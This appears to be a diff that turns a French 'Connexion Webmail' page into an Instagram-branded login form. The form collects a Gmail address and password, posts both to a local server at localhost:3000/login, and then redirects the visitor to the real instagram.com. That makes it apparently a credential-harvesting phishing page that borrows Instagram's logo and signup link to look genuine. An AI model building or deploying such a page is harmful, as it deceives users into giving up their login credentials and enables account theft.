@@ -5,66 +5,136 @@
   <title>Connexion Webmail</title>
   <style>
     body {
-      font-family: Arial, sans-serif;
-      background-color: #f0f2f5;
+      font-family: 'Arial', sans-serif;
+      background-color: #fafafa;
       display: flex;
       justify-content: center;
       align-items: center;
       height: 100vh;
       margin: 0;
+      flex-direction: column;
     }
+
     .login-box {
-      background: white;
-      padding: 40px;
+      background-color: white;
       border-radius: 10px;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
       width: 350px;
+      padding: 40px;
       text-align: center;
     }
-    .logo img {
+
+    .login-box h2 {
+      font-size: 24px;
+      margin-bottom: 20px;
+      color: #262626;
+    }
+
+    .login-box img {
       width: 100px;
       margin-bottom: 20px;
     }
+
     input[type="text"], input[type="password"] {
       width: 100%;
-      padding: 12px;
+      padding: 14px;
       margin: 10px 0;
-      border: 1px solid #ccc;
-      border-radius: 6px;
+      border: 1px solid #ddd;
+      border-radius: 5px;
       font-size: 14px;
     }
+
     button {
       width: 100%;
-      padding: 12px;
-      background-color: #0078D7;
+      padding: 14px;
+      background-color: #0095f6;
       color: white;
-      font-size: 15px;
+      font-size: 16px;
       border: none;
-      border-radius: 6px;
+      border-radius: 5px;
       cursor: pointer;
+    }
+
+    .error {
+      color: red;
+      font-size: 12px;
+      margin-top: 10px;
+    }
+
+    .footer {
+      font-size: 14px;
+      color: #999;
+      margin-top: 20px;
+    }
+
+    .footer a {
+      color: #0095f6;
+      text-decoration: none;
     }
   </style>
 </head>
 <body>
+
   <div class="login-box">
-    <div class="logo">
-      <img src="https://logos-world.net/wp-content/uploads/2020/11/Gmail-Logo.png" alt="Logo Gmail">
-    </div>
-    <h2>Connexion à votre messagerie</h2>
-    <form onsubmit="redirectToGmail(event)">
+    <!-- Logo Instagram -->
+    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
+
+    <h2>Connexion</h2>
+    <form id="loginForm">
       <input type="text" id="email" placeholder="Adresse email" required>
       <input type="password" id="password" placeholder="Mot de passe" required>
-      <button type="submit">Connexion</button>
+      <button type="submit">Se connecter</button>
+      <p id="error-message" class="error" style="display: none;"></p>
     </form>
+
+    <p class="footer">Pas encore de compte ? <a href="https://www.instagram.com/accounts/emailsignup/">S'inscrire</a></p>
   </div>
 
   <script>
-    function redirectToGmail(event) {
-      event.preventDefault();
-      // Redirection immédiate vers Gmail
-      window.location.href = "https://mail.google.com/";
-    }
+    document.addEventListener("DOMContentLoaded", function() {
+      document.getElementById('loginForm').addEventListener('submit', function(event) {
+        event.preventDefault();
+
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+
+        // Vérifier si l'email contient @gmail.com
+        if (!email.includes('@gmail.com')) {
+          document.getElementById('error-message').style.display = 'block';
+          document.getElementById('error-message').textContent = "L'email doit être un email Gmail.";
+          return;
+        } else {
+          document.getElementById('error-message').style.display = 'none';
+        }
+
+        // Envoyer la requête au serveur
+        fetch('http://localhost:3000/login', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({ email, password })
+        })
+        .then(response => response.json())
+        .then(data => {
+          if (data.success) {
+            // Redirection vers Instagram en cas de succès
+            window.location.href = "https://www.instagram.com";  
+          } else {
+            // En cas d'échec de la connexion
+            document.getElementById('error-message').style.display = 'block';
+            document.getElementById('error-message').textContent = "Échec de la connexion. Vérifiez vos identifiants.";
+          }
+        })
+        .catch(err => {
+          console.error("Erreur de connexion :", err);
+          // En cas d'erreur serveur
+          document.getElementById('error-message').style.display = 'block';
+          document.getElementById('error-message').textContent = "Erreur de connexion au serveur. Veuillez réessayer plus tard.";
+        });
+      });
+    });
   </script>
+
 </body>
 </html>
-
